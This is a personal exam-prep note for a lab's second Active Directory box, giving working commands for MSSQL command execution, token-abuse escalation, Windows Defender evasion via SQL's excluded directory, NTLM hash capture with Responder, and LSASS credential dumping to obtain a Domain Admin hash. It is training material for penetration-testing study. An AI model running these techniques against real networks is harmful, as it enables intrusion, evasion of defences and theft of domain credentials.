# 🎯 MS02 — Exam Solve Guide (Lateral)

> The **second AD box** — usually a SQL/support server reached only through the MS01 pivot. Pattern: reuse the cracked service cred → command exec → local SYSTEM via token abuse → harvest a **Domain Admin** credential cached on the box. Values are placeholders.

Part of [[Active Directory]] · [[AD Attack Framework]]. Prev: [[MS01 — Exam Solve Guide (Foothold)|MS01]] · next: [[DC01 — Exam Solve Guide (Domain)|DC01]] · overview: [[Exam AD Set — Solve Overview]].

```bash
export IP=<MS02_IP> DOMAIN=<domain.tld> DC=<DC_IP>
# reachable through the MS01 ligolo route; often NO reverse route → use the forward (MSSQL/SMB) channel
```

## 1. Access — reuse the service cred
```bash
nxc mssql $IP -u <svc_acct> -p '<cracked_pass>'                     # (Pwn3d!) = you're in
impacket-mssqlclient $DOMAIN/<svc_acct>:'<cracked_pass>'@$IP -windows-auth
```
```sql
enable_xp_cmdshell
EXEC xp_cmdshell 'whoami /priv'       -- expect: nt service\mssql... + SeImpersonatePrivilege Enabled
```
(No MSSQL? reuse the cred/hash over [[WinRM]] or SMB [[Pass-the-Hash]] instead.)

## 2. PrivEsc — SeImpersonate → SYSTEM (Defender-aware)
```sql
-- GodPotato again; but Defender is often ON + tamper-protected here.
-- Trick that works: SQL Server auto-excludes its own DATA dir from Defender.
SELECT physical_name FROM sys.master_files WHERE database_id=1;   -- gives the excluded dir
-- base64-upload the binary into that dir over the MSSQL session, certutil -decode, run via 8.3 short path:
xp_cmdshell C:\PROGRA~1\MICROS~3\MSSQL1~1.SQL\MSSQL\DATA\g.exe -cmd "cmd /c whoami"   -- nt authority\system
```
([[Token Privileges & Potato]]) A `C:\Users\Administrator.<DOMAIN>` profile = **the DA has logged on here → DA creds are in LSASS**.

## 3. Harvest the Domain Admin credential
Two reliable routes — pick by what Defender allows:
```powershell
# (a) direct, if execution isn't blocked:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
```bash
# (b) mimikatz blocked on exec → create a local admin as SYSTEM, flip the token policy, dump LSASS REMOTELY:
#   net user <adm> <pw> /add ; net localgroup Administrators <adm> /add
#   reg add ...\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
nxc smb $IP -u <adm> -p '<pw>' --local-auth -M lsassy        # pulls cached DOMAIN\Administrator NTLM
```
([[Dumping Windows Hashes]]) Result: **DA username + NTLM hash** — no cracking needed.

## ➡️ Handoff
Take the **DA hash** to [[DC01 — Exam Solve Guide (Domain)]] (PtH → DCSync). MS02 is often a *support* box with **no proof.txt** — the graded flag is on the DC.

## 🧩 Real-world problems & fixes

### MSSQL — "I'm in, but can't get exec"
- **`xp_cmdshell` is disabled** → re-enable it (needs sysadmin):
```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;   -- impacket shortcut: just type  enable_xp_cmdshell
```
- **You're NOT sysadmin** (can't enable it):
  - **Impersonation** — find a login you may run as, then become it:
```sql
SELECT name FROM sys.server_principals WHERE type IN ('S','U') ;   -- candidates
EXECUTE AS LOGIN = 'sa';  SELECT IS_SRVROLEMEMBER('sysadmin');      -- 1 = you're sysadmin now
```
  - **Linked servers** — you might be sysadmin on a *linked* instance:
```sql
EXEC sp_linkedservers;
SELECT * FROM OPENQUERY("LINKED", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');   -- or EXECUTE('...') AT "LINKED"
```
  - **OLE automation** (`sp_OACreate`) as an `xp_cmdshell` alternative when it can't be enabled.
- **Only a low-priv SQL login? Capture the service account's hash** — point MSSQL at your box:
```bash
sudo responder -I tun0            # terminal 1
```
```sql
EXEC xp_dirtree '\\<KALI>\share';  -- or xp_fileexist / xp_subdirs → Responder prints mssql_svc NetNTLMv2
```
```bash
hashcat -m 5600 mssql_svc.ntlmv2 /usr/share/wordlists/rockyou.txt   # crack  (or relay with ntlmrelayx)
```
This is the direct answer to *"how do I get the `mssql_svc` hash?"* when you're not admin yet. ([[MSSQL]])

### Windows Defender is ON (and tamper-protected)
- **Binary deleted on upload** (GodPotato/mimikatz/nc vanish from `C:\Windows\Temp`) → real-time scan. **SQL Server auto-excludes its own DATA dir** — drop tooling there instead:
```sql
SELECT physical_name FROM sys.master_files WHERE database_id=1;     -- the excluded dir
-- base64-upload into it over the MSSQL session → certutil -decode → run via the 8.3 short path (PROGRA~1)
```
  If you have a shell: confirm exclusions with `Get-MpPreference | select Exclusion*`.
- **Can't turn Defender off even as SYSTEM** → tamper protection. Don't fight it — use the exclusion dir + signed LOLBINs.
- **mimikatz uploads but dies on *execution*** (behavioral/AMSI, `error code 5`) → never run it on the box. Dump LSASS another way:
  - **Remote** (cleanest): create a local admin as SYSTEM, flip the token policy, dump over SMB — no flagged binary runs on the host:
```bash
nxc smb $IP -u <adm> -p '<pw>' --local-auth -M lsassy        # or -M nanodump
```
  - **LOLBIN minidump** (offline parse): drop the dump in the excluded dir, exfil, parse on Kali:
```cmd
tasklist /fi "imagename eq lsass.exe"      :: get the PID
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> "...\MSSQL\DATA\l.dmp" full
```
```bash
pypykatz lsa minidump l.dmp                # cleartext + NT hashes + tickets, offline
```
  - **procdump** (Sysinternals, signed) `procdump.exe -accepteula -ma lsass.exe l.dmp` → parse offline.
- **PowerShell payload flagged by AMSI** → prefer a compiled tool in the exclusion dir over a PS one-liner.

### You have admin/SYSTEM — now pull every credential
Work them in this order; each answers a different "which creds do I get":
```bash
reg save HKLM\SAM sam & reg save HKLM\SYSTEM sys & reg save HKLM\SECURITY sec   # grab all three hives
impacket-secretsdump -sam sam -system sys -security sec LOCAL
#   → SAM        : local account NT hashes (local Administrator → PtH)
#   → LSA Secrets: **service-account CLEARTEXT** — this is where mssql_svc's password falls out
#                  (a service running as a domain/user account is stored under _SC_<svc> in LSA)
#   → cached DCC2: hashcat -m 2100   (slow; last resort)
```
- **Remote equivalent** (no hive copy): `nxc smb $IP -u <adm> -p '<pw>' --local-auth --sam --lsa`.
- **LSASS** (lsassy / comsvcs / procdump above) → cleartext + NT hashes + Kerberos tickets of **every logged-on user**, including a cached **Domain Admin**.
- **Still want `mssql_svc` specifically and LSA didn't yield it?** It has an SPN → **Kerberoast** it from any domain user: `impacket-GetUserSPNs <dom>/<u>:<p> -dc-ip <DC> -request` → `hashcat -m 13100` ([[Kerberoasting]]).
- Also sweep stored creds: `cmdkey /list`, PSReadLine history, `web.config`/app configs ([[Windows Stored Credentials]]).

> **Decision shortcut:** not admin → `xp_dirtree`+Responder (NetNTLM) or impersonation/linked-server. Admin, Defender quiet → mimikatz/secretsdump. Admin, Defender loud → excluded-dir drop + **remote lsassy** or comsvcs minidump → offline pypykatz.

## 🔑 Exam reminders
- **No reverse route** off MS02 is normal → upload over the existing forward channel (MSSQL `upload`/base64 + `certutil`), don't fish for a reverse shell.
- Defender blocks GodPotato/mimikatz on *write/exec* → use the **SQL excluded dir** and **remote lsassy**.
- Non-builtin local admins are UAC token-filtered over SMB → set `LocalAccountTokenFilterPolicy=1` first.
- Before leaving: confirm a DA credential is actually in hand — that's the whole point of MS02.
